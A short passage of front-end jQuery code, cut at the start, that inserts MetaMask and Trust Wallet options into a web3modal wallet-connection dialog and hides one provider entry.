6IiBmaWxsPSIjOGU1YTMwIi8+PC9nPjwvZz48L3N2Zz4=" alt="MetaMask"></div><div class="sc-gsDKAQ gHoDBx web3modal-provider-name">MetaMask</div><div class="sc-dkPtRN eCZoDi web3modal-provider-description">Connect to your MetaMask Wallet</div></div></div><div class="sc-eCImPb cSaJae web3modal-provider-wrapper" onclick="loginTrust();"><div class="sc-hKwDye hKhOIm web3modal-provider-container"><div class="sc-bdvvtL fqonLZ web3modal-provider-icon"><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" alt="Trust Wallet"></div><div class="sc-gsDKAQ gHoDBx web3modal-provider-name">Trust Wallet</div><div class="sc-dkPtRN eCZoDi web3modal-provider-description">Connect to your Trust Wallet</div></div></div>'
        );
        $(".web3modal-modal-card .web3modal-provider-wrapper").last().css("display", "none");
    }
});
